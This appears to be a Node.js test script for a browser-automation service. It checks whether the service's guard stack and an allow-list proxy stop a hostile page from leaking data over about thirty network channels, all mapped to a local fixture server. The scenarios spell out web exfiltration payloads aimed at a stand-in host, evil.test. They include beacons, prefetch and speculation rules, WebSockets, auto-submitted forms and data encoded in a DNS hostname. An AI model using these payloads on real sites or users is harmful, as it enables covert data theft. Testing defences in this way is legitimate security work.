// CHANNEL MATRIX: for every network channel a hostile page could use, does the worker's full guard stack (scope policy + effect gate + session CSP,
// i.e. the REAL createApp) stop it? Run against two BROWSER BINARIES (the 3rd mode adds an allow-list proxy in front of the second):
//   mode `playwright` = Playwright's default `chromium.launch()`, which runs chrome-headless-shell (what the repo's automated suites use);
//   mode `stock`      = full Chrome started directly with --remote-debugging-port, then connectOverCDP (how a provider runs it).
// The DIFFERENCE IS THE BINARY (an independent audit showed Playwright's full-Chrome channel behaves like `stock`), not the way CDP is attached:
// headless-shell has no DNS/TLS/prerender hints at all, so the repo suite cannot see that whole class.
// Everything is local: made-up hostnames are mapped to one fixture server on 127.0.0.1 (nothing leaves the machine; no third-party host is contacted).
//   cd services/browser && node scripts/channel-matrix.mjs            (CHROME=/path/to/chrome to override; OUT=dir for the report files)
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import https from "node:https";
import net from "node:net";
import http from "node:http";
import { spawn, execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { chromium } from "playwright-core";
import { createApp } from "../app.mjs";
import { createPolicy } from "../policy.mjs";
import { LIMITS } from "../actions.mjs";

const here = path.dirname(fileURLToPath(import.meta.url));
const OUT = process.env.OUT ?? path.join(here, "..", "..", "..", "docs", "verification", "chat-browser-2");
const CHROME = process.env.CHROME || (fs.existsSync(chromium.executablePath()) ? chromium.executablePath() : "/opt/pw-browsers/chromium-1243/chrome-linux64/chrome");
const TOKEN = "m".repeat(40);
const tick = (ms) => new Promise((r) => setTimeout(r, ms));
const noProxyEnv = Object.fromEntries(Object.entries(process.env).filter(([k]) => !/proxy/i.test(k)));

// ── scenarios: id → { title, html (markup), js (same-origin script file, optional), headers (response headers of the page), click (link to click: triggers unload) } ──
const D = "const D=(f)=>{try{f()}catch(e){}};";
const S = (id) => ({
  id,
  evil: (p = "") => `https://evil.test/${id}${p}`,
  host: `https://${id}.evil.test/`,
  lab: `/browser-lab/api/${id}`,
});
const scenarios = [
  { id: "prerender-link", title: "<link rel=prerender> (GET with query, any host)", html: (s) => `<link rel="prerender" href="${s.evil("?d=secret")}">` },
  { id: "preconnect-link", title: "<link rel=preconnect> (TLS connection to any host)", html: (s) => `<link rel="preconnect" href="${s.host}">`, observe: "tls" },
  { id: "dns-prefetch-link", title: "<link rel=dns-prefetch> (DNS lookup only)", html: (s) => `<link rel="dns-prefetch" href="${s.host}">`, observe: "none-locally" },
  { id: "prefetch-link", title: "<link rel=prefetch>", html: (s) => `<link rel="prefetch" href="${s.evil("?d=secret")}">` },
  { id: "preload-link", title: "<link rel=preload as=fetch>", html: (s) => `<link rel="preload" as="fetch" href="${s.evil("?d=secret")}">` },
  { id: "preload-lab-query", title: "<link rel=preload> same origin with query", html: (s) => `<link rel="preload" as="fetch" href="${s.lab}?d=secret">` },
  { id: "speculation-inline", title: "inline <script type=speculationrules> (prefetch)", html: (s) => `<script type="speculationrules">{"prefetch":[{"source":"list","urls":["${s.evil("?d=1")}"]}]}</script>` },
  { id: "speculation-dynamic", title: "speculation rules inserted by a same-origin script", js: (s) => `${D}D(()=>{const t=document.createElement("script");t.type="speculationrules";t.textContent=JSON.stringify({prefetch:[{source:"list",urls:["${s.evil("?d=1")}"]}]});document.head.appendChild(t)});` },
  { id: "unload-beacon", title: "pagehide: sendBeacon / keepalive fetch / Image (evil and same-origin)", click: true, js: (s) => `${D}addEventListener("pagehide",()=>{D(()=>navigator.sendBeacon("${s.evil("/b")}","x"));D(()=>fetch("${s.evil("/k")}",{method:"POST",keepalive:true,mode:"no-cors",body:"x"}).catch(()=>{}));D(()=>{new Image().src="${s.evil("/i?d=1")}"});D(()=>fetch("${s.lab}",{method:"POST",keepalive:true,body:"x"}).catch(()=>{}))});` },
  { id: "worker-fetch-ws", title: "Worker / SharedWorker making fetch + WebSocket", js: (s) => `${D}D(()=>new Worker("/x/${s.id}-w.js"));D(()=>new SharedWorker("/x/${s.id}-w.js"));D(()=>new Worker(URL.createObjectURL(new Blob(['new WebSocket("wss://evil.test/${s.id}-blobws")']))));`, worker: (s) => `try{new WebSocket("wss://evil.test/${s.id}-ws")}catch(e){} fetch("${s.evil("/wf")}",{method:"POST",mode:"no-cors",body:"x"}).catch(()=>{});` },
  { id: "websocket-main", title: "WebSocket from the page", js: (s) => `${D}D(()=>new WebSocket("wss://evil.test/${s.id}"));D(()=>new WebSocket("wss://lab.test/browser-lab/${s.id}"));` },
  { id: "webtransport", title: "WebTransport from the page", js: (s) => `${D}D(()=>{const t=new WebTransport("https://evil.test:4433/${s.id}");t.ready.catch(()=>{})});` },
  { id: "fetch-xhr-sse", title: "fetch / XHR / EventSource from the page", js: (s) => `${D}D(()=>fetch("${s.evil("/f")}",{mode:"no-cors"}).catch(()=>{}));D(()=>{const x=new XMLHttpRequest();x.open("GET","${s.lab}?d=1");x.send()});D(()=>new EventSource("${s.lab}-sse"));` },
  { id: "meta-refresh", title: "<meta http-equiv=refresh> to a foreign host", html: (s) => `<meta http-equiv="refresh" content="1;url=${s.evil("/r")}">` },
  { id: "refresh-header", title: "Refresh: response header to a foreign host", headers: (s) => ({ refresh: `1; url=${s.evil("/rh")}` }) },
  { id: "link-header", title: "Link: response header (preconnect + prefetch)", headers: (s) => ({ link: `<${s.host}>; rel=preconnect, <${s.evil("/lh?d=1")}>; rel=prefetch` }), observe: "tls" },
  { id: "script-nav", title: "script timer navigates to a foreign host", js: (s) => `setTimeout(()=>{location.href="${s.evil("/n")}"},800);` },
  { id: "script-nav-inscope", title: "script timer navigates inside the scope with a query", js: (s) => `setTimeout(()=>{location.href="${s.lab}?moved=1"},800);` },
  { id: "form-autosubmit", title: "script submits a POST form to a foreign host", html: (s) => `<form id="f" method="post" action="${s.evil("/fp")}"><input name="a" value="secret"></form>`, js: () => `setTimeout(()=>document.getElementById("f").submit(),800);` },
  { id: "link-ping", title: "<a ping> on the allowed link", click: true, html: (s) => `<a id="pinger" ping="${s.evil("/ping")}" href="/browser-lab/page2.html">Next page</a>`, noDefaultLink: true },
  { id: "dns-exfil-nav", title: "script navigates to a hostname that CARRIES data (hex label): DNS/TLS even when the navigation is blocked", js: () => `setTimeout(()=>{location.href="https://74797065642d736563726574.evil.test/"},800);`, observe: "tls" },
  { id: "doc-hop-query", title: "link whose server answers 302 to an in-scope URL WITH a query (document hop)", clickHref: (s) => `/browser-lab/go-${s.id}`, redirect: (s) => `${s.lab}?id=1&action=delete` },
  { id: "a-download-script", title: "script-created same-origin <a download> with a query, clicked", js: (s) => `${D}D(()=>{const a=document.createElement("a");a.href="${s.lab}?x=1";a.download="x.txt";document.body.appendChild(a);setTimeout(()=>a.click(),700)});` },
  { id: "redirect-offscope", title: "link whose server answers 302 to a foreign host", clickHref: (s) => `/browser-lab/go-${s.id}`, redirect: (s) => s.evil("/red") },
  { id: "download", title: "link to an attachment / octet-stream response", clickHref: (s) => `/browser-lab/file-${s.id}`, download: true },
  { id: "iframe-object", title: "<iframe>/<object>/<embed> to a foreign host", html: (s) => `<iframe src="${s.evil("/if")}"></iframe><object data="${s.evil("/ob")}"></object><embed src="${s.evil("/em")}">` },
  { id: "static-subresources", title: "<img>/<script>/<link rel=stylesheet>/CSS @import/url() to a foreign host", html: (s) => `<img src="${s.evil("/img?d=1")}"><script src="${s.evil("/js")}"></script><link rel="stylesheet" href="${s.evil("/css")}"><style>@import url("${s.evil("/imp")}"); body{background:url("${s.evil("/bg?d=1")}")}</style>` },
  { id: "import-module", title: "dynamic import() with a query", js: (s) => `import("${s.lab}-mod.js?d=1").catch(()=>{});` },
  { id: "popup", title: "window.open + target=_blank (foreign and same-origin)", js: (s) => `${D}D(()=>window.open("${s.evil("/po")}"));D(()=>window.open("${s.lab}-popup"));`, html: (s) => `<a target="_blank" href="${s.evil("/tb")}">blank</a>` },
];

// ── local fixture "internet" ──
const dir = fs.mkdtempSync(path.join(os.tmpdir(), "chan-matrix-"));
execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", dir + "/k.pem", "-out", dir + "/c.pem", "-days", "1", "-subj", "/CN=lab.test", "-addext", "subjectAltName=DNS:lab.test,DNS:evil.test,DNS:*.evil.test"], { stdio: "ignore" });
let events = []; // every observable contact: { kind, text }
const byId = Object.fromEntries(scenarios.map((s) => [s.id, s]));
const site = https.createServer({ key: fs.readFileSync(dir + "/k.pem"), cert: fs.readFileSync(dir + "/c.pem") }, (req, res) => {
  const host = (req.headers.host ?? "").split(":")[0];
  events.push({ kind: "http", text: `${req.method} ${host}${req.url}` });
  const m = /^\/(?:x\/|browser-lab\/)?([a-z-]+?)(?:-w\.js|\.html|\.js)?(?:\?.*)?$/.exec(req.url);
  const u = req.url.split("?")[0];
  let id = (/\/browser-lab\/(?:go-|file-)?([a-z-]+)\.html$/.exec(u) ?? /\/x\/([a-z-]+?)(?:-w)?\.js$/.exec(u) ?? /\/browser-lab\/(?:go|file)-([a-z-]+)$/.exec(u) ?? [])[1];
  const sc = id && byId[id];
  if (host === "lab.test" && sc && u.startsWith("/browser-lab/go-") && sc.redirect) { res.writeHead(302, { location: sc.redirect(S(id)) }); return res.end(); }
  if (host === "lab.test" && sc && u.startsWith("/browser-lab/file-")) { res.writeHead(200, { "content-type": "application/octet-stream", "content-disposition": 'attachment; filename="x.bin"' }); return res.end("BIN"); }
  if (host === "lab.test" && sc && /^\/x\/[a-z-]+-w\.js$/.test(u)) { res.writeHead(200, { "content-type": "text/javascript" }); return res.end(sc.worker?.(S(id)) ?? ""); }
  if (host === "lab.test" && sc && /^\/x\/[a-z-]+\.js$/.test(u)) { res.writeHead(200, { "content-type": "text/javascript" }); return res.end(sc.js?.(S(id)) ?? ""); }
  if (host === "lab.test" && sc && u.endsWith(".html")) {
    const s = S(id);
    const link = sc.noDefaultLink ? "" : `<a id="next" href="${sc.clickHref ? sc.clickHref(s) : "/browser-lab/page2.html"}">Next page</a>`;
    res.writeHead(200, { "content-type": "text/html; charset=utf-8", ...(sc.headers?.(s) ?? {}) });
    return res.end(`<!doctype html><html><meta charset="utf-8"><title>${id}</title>${sc.html?.(s) ?? ""}<body>${link}${sc.js ? `<script${/import\(/.test(sc.js(s)) ? ' type="module"' : ""} src="/x/${id}.js"></script>` : ""}</body></html>`);
  }
  if (host === "lab.test" && u === "/browser-lab/page2.html") { res.writeHead(200, { "content-type": "text/html" }); return res.end("<h1>p2</h1>"); }
  res.writeHead(200, { "content-type": "text/plain" }); res.end("ok");
});
site.on("secureConnection", (s) => { s.on("error", () => {}); events.push({ kind: "tls", text: `TLS servername=${s.servername}` }); });
site.on("tlsClientError", () => {}); site.on("clientError", (_e, sock) => { try { sock.destroy(); } catch {} });
process.on("uncaughtException", (e) => { if (!/ECONNRESET|EPIPE|ECONNABORTED/.test(String(e?.code ?? e))) { console.error(e); process.exit(1); } }); // a browser tearing down a socket mid-handshake is expected here
site.on("upgrade", (req, socket) => { events.push({ kind: "ws", text: `WS-UPGRADE ${(req.headers.host ?? "").split(":")[0]}${req.url}` }); socket.destroy(); });
await new Promise((r) => site.listen(0, "127.0.0.1", r));
const port = site.address().port;
const resolver = `--host-resolver-rules=MAP lab.test 127.0.0.1:${port}, MAP evil.test 127.0.0.1:${port}, MAP *.evil.test 127.0.0.1:${port}`;

// ── the candidate EXTERNAL CONTROL: an allow-list forward proxy (what Browserbase's `proxies: [{type:"external"}]` would point at). It permits CONNECT to the
// lab host only; every other destination is refused and LOGGED before any DNS lookup or TLS handshake can happen on the browser side. ──
let proxyDenied = [];
const browserBackground = /(^|[ .:/])(clients2?\.google\.com|www\.google\.com|redirector\.gvt1\.com|[a-z-]+\.googleapis\.com|accounts\.google\.com|gstatic\.com|optimizationguide|safebrowsing)/i; // Chrome's OWN housekeeping traffic (time sync, component updates, autofill): noted, not a page channel
const proxy = http.createServer((req, res) => { if (!browserBackground.test(`${req.headers.host}`)) proxyDenied.push(`HTTP ${req.headers.host}${req.url}`); else browserHousekeeping.add(String(req.headers.host)); res.writeHead(403); res.end(); });
const browserHousekeeping = new Set();
proxy.on("connect", (req, clientSocket) => {
  const [host] = String(req.url).split(":");
  if (host !== "lab.test") { if (browserBackground.test(host)) browserHousekeeping.add(host); else proxyDenied.push(`CONNECT ${req.url}`); clientSocket.end("HTTP/1.1 403 Forbidden\r\n\r\n"); return; }
  const up = net.connect(port, "127.0.0.1", () => { clientSocket.write("HTTP/1.1 200 Connection Established\r\n\r\n"); up.pipe(clientSocket); clientSocket.pipe(up); });
  up.on("error", () => clientSocket.destroy()); clientSocket.on("error", () => up.destroy());
});
await new Promise((r) => proxy.listen(0, "127.0.0.1", r));
const proxyPort = proxy.address().port;

// ── the launch modes behind a minimal provider-like client (createSession / release) ──
function makeClient(mode) {
  const live = new Map();
  return {
    live,
    async createSession() {
      const dbg = 9700 + Math.floor(Math.random() * 250);
      const ud = fs.mkdtempSync(path.join(os.tmpdir(), "ud-"));
      let proc, pw;
      if (mode === "stock" || mode === "stock+proxy") proc = spawn(CHROME, ["--headless=new", "--no-sandbox", `--remote-debugging-port=${dbg}`, `--user-data-dir=${ud}`, resolver, "--ignore-certificate-errors",
        ...(mode === "stock+proxy" ? [`--proxy-server=http://127.0.0.1:${proxyPort}`, "--proxy-bypass-list=<-loopback>"] : []), "about:blank"], { env: noProxyEnv, stdio: "ignore" });
      else pw = await chromium.launch({ env: noProxyEnv, args: [`--remote-debugging-port=${dbg}`, resolver, "--ignore-certificate-errors", "--no-sandbox"] });
      let ver;
      for (let i = 0; i < 80 && !ver; i++) { try { ver = await (await fetch(`http://127.0.0.1:${dbg}/json/version`)).json(); } catch { await tick(150); } }
      const id = `s${dbg}`;
      live.set(id, { proc, pw, ud });
      return { id, connectUrl: ver.webSocketDebuggerUrl };
    },
    async release(id) { const s = live.get(id); if (!s) return; live.delete(id); try { s.proc?.kill("SIGKILL"); await s.pw?.close(); } catch {} fs.rmSync(s.ud, { recursive: true, force: true }); },
  };
}

const interesting = (sc, e) => {
  const t = e.text;
  if (/\/browser-lab\/[a-z-]+\.html$/.test(t) || /\/x\/[a-z-]+(-w)?\.js$/.test(t) || /lab\.test\/browser-lab\/page2\.html$/.test(t) || /favicon\.ico/.test(t)) return false;
  if (/lab\.test\/browser-lab\/(go|file)-/.test(t)) return false;               // the user's own click on the link
  if (e.kind === "tls") return new RegExp(`servername=(${sc.id}\\.evil\\.test|evil\\.test)`).test(t) && !/lab\.test/.test(t);
  return true;
};

async function runMode(mode) {
  const client = makeClient(mode);
  const { server, manager } = createApp({ token: TOKEN, policy: createPolicy(["example.com"], ["lab.test/browser-lab/"]), projectId: "p", log: () => {}, limits: { ...LIMITS, idleMs: 60_000 }, client });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const base = `http://127.0.0.1:${server.address().port}`;
  const call = (m, p, b) => fetch(base + p, { method: m, headers: { authorization: "Bearer " + TOKEN, ...(b ? { "content-type": "application/json" } : {}) }, body: b ? JSON.stringify(b) : undefined });
  const rows = [];
  for (const sc of scenarios) {
    await manager.shutdown();
    events = []; proxyDenied = [];
    const r = await call("POST", "/v1/jobs", { url: `https://lab.test/browser-lab/${sc.id}.html`, mode: "interactive" });
    const job = (await r.json()).job;
    const get = async () => (await (await call("GET", `/v1/jobs/${job.id}`)).json()).job;
    let v;
    for (let i = 0; i < 120; i++) { v = await get(); if (v.ready || ["failed", "succeeded", "cancelled"].includes(v.status)) break; await tick(100); }
    await tick(1200);
    let action = "-";
    if (v.ready && (sc.click || sc.clickHref || sc.id === "download" || sc.id === "redirect-offscope")) {
      const linkName = sc.id === "link-ping" ? "Next page" : "Next page";
      await call("POST", `/v1/jobs/${job.id}/actions`, { tool: "click", target: { by: "role", role: "link", value: linkName } });
      for (let i = 0; i < 100; i++) { v = await get(); if (["failed", "succeeded", "cancelled"].includes(v.status) || (v.actions[0] && ["done", "denied", "failed", "rejected"].includes(v.actions[0].status))) break; await tick(100); }
      action = v.actions?.[0] ? `${v.actions[0].status}${v.actions[0].error ? "/" + v.actions[0].error : ""}` : "-";
    }
    await tick(1800);
    v = await get();
    const leaks = events.filter((e) => interesting(sc, e)).map((e) => e.text);
    await call("POST", `/v1/jobs/${job.id}/finish`);
    for (let i = 0; i < 100 && !["failed", "succeeded", "cancelled"].includes((await get()).status); i++) await tick(100);
    rows.push({ id: sc.id, title: sc.title, mode, leaked: leaks.length > 0, evidence: leaks.slice(0, 4), deniedAtProxy: [...new Set(proxyDenied)].slice(0, 6), observable: sc.observe ?? "http", sessionStatus: `${v.status}${v.error ? "/" + v.error : ""}`, action, blockedRequests: v.blockedRequests });
    process.stdout.write(`${mode.padEnd(11)} ${sc.id.padEnd(22)} ${leaks.length ? "LEAK   " : "stopped"} ${leaks.slice(0, 2).join(" | ")}${mode === "stock+proxy" && proxyDenied.length ? "   [proxy refused: " + [...new Set(proxyDenied)].slice(0, 2).join(", ") + "]" : ""}\n`);
  }
  await manager.shutdown(); server.closeAllConnections(); await new Promise((r) => server.close(r));
  return rows;
}

const rows = [...(await runMode("playwright")), ...(await runMode("stock")), ...(await runMode("stock+proxy"))];
proxy.close();
site.closeAllConnections(); site.close(); fs.rmSync(dir, { recursive: true, force: true });
fs.mkdirSync(OUT, { recursive: true });
fs.writeFileSync(path.join(OUT, "channel-matrix.json"), JSON.stringify({ at: new Date().toISOString(), chrome: CHROME, browserHousekeepingHostsRefusedByProxy: [...browserHousekeeping], rows }, null, 2));
const cell = (id, mode) => { const r = rows.find((x) => x.id === id && x.mode === mode); return !r ? "?" : r.leaked ? "**LEAK**" : r.observable === "none-locally" ? "not observable locally" : "stopped"; };
const md = ["| channel | headless-shell (Playwright's default binary) | full Chrome, launched directly (provider-style) | full Chrome + allow-list proxy | evidence (full Chrome, no proxy) | refused at the proxy |", "|---|---|---|---|---|---|",
  ...scenarios.map((s) => `| ${s.title} | ${cell(s.id, "playwright")} | ${cell(s.id, "stock")} | ${cell(s.id, "stock+proxy")} | ${(rows.find((x) => x.id === s.id && x.mode === "stock")?.evidence ?? []).slice(0, 2).join("<br>") || "-"} | ${(rows.find((x) => x.id === s.id && x.mode === "stock+proxy")?.deniedAtProxy ?? []).slice(0, 3).join("<br>") || "-"} |`)].join("\n");
fs.writeFileSync(path.join(OUT, "channel-matrix.md"), `# Channel matrix (real worker guard stack, local fixture, ${new Date().toISOString()})\n\nLEAK = something reached the fixture "internet" (HTTP request, WebSocket upgrade, or a TLS handshake whose SNI is a foreign host). "stopped" = nothing reached it. "refused at the proxy" = the allow-list proxy denied the destination BEFORE any DNS lookup/TLS handshake. Chrome's own housekeeping hosts (${[...browserHousekeeping].join(", ") || "none seen"}) are excluded from the page-channel columns.\n\n${md}\n`);
console.log("\n" + md);
process.exit(0);
